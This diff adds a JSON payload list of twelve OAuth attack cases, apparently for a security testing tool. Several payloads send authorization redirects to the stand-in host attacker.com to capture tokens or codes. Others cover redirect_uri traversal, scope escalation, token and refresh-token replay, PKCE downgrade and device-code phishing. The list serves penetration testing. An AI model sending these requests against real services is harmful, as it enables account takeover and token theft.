@@ -1,0 +1,14 @@
+[
+  {"name":"Implicit Grant Token Leak","category":"OAuth","description":"Token in URL fragment for implicit grant","payload":"GET /authorize?response_type=token&client_id=CLIENT&redirect_uri=https://attacker.com","tags":["implicit","token-leak"]},
+  {"name":"Auth Code Interception","category":"OAuth","description":"Auth code redirect to attacker","payload":"GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=https://attacker.com/callback&state=xyz","tags":["auth-code","interception"]},
+  {"name":"Redirect URI Bypass","category":"OAuth","description":"Open redirect bypass for redirect_uri","payload":"redirect_uri=https://target.com/callback/../../../attacker.com","tags":["redirect-uri","bypass"]},
+  {"name":"State Parameter Missing","category":"OAuth","description":"CSRF via missing state parameter","payload":"GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=https://target.com/callback","tags":["csrf","state","missing"]},
+  {"name":"Scope Escalation","category":"OAuth","description":"Request broader scopes than authorized","payload":"scope=read+write+admin+email+profile","tags":["scope","privilege-escalation"]},
+  {"name":"Token Reuse After Logout","category":"OAuth","description":"Test if access token valid after logout","payload":"GET /api/me\nAuthorization: Bearer <old_token>","tags":["token-reuse","logout"]},
+  {"name":"Refresh Token Rotation Bypass","category":"OAuth","description":"Reuse old refresh token","payload":"POST /token\ngrant_type=refresh_token&refresh_token=<old_used_token>","tags":["refresh-token","replay"]},
+  {"name":"PKCE Missing","category":"OAuth","description":"Auth code without PKCE (interception risk)","payload":"GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=https://target.com/callback (no code_challenge)","tags":["pkce","missing","auth-code"]},
+  {"name":"PKCE Downgrade","category":"OAuth","description":"Remove PKCE from PKCE-required flow","payload":"POST /token\ngrant_type=authorization_code&code=CODE&redirect_uri=REDIRECT (no code_verifier)","tags":["pkce","downgrade"]},
+  {"name":"Client Secret Leak","category":"OAuth","description":"Check for client_secret in public JS","payload":"grep -r 'client_secret' *.js","tags":["client-secret","recon"]},
+  {"name":"Device Code Phishing","category":"OAuth","description":"Device code flow abuse for phishing","payload":"POST /device_authorization\nclient_id=CLIENT","tags":["device-code","phishing"]},
+  {"name":"Token Audience Bypass","category":"OAuth","description":"Use token for unintended audience","payload":"POST /api/resource\nAuthorization: Bearer <token_for_other_service>","tags":["audience","bypass"]}
+]
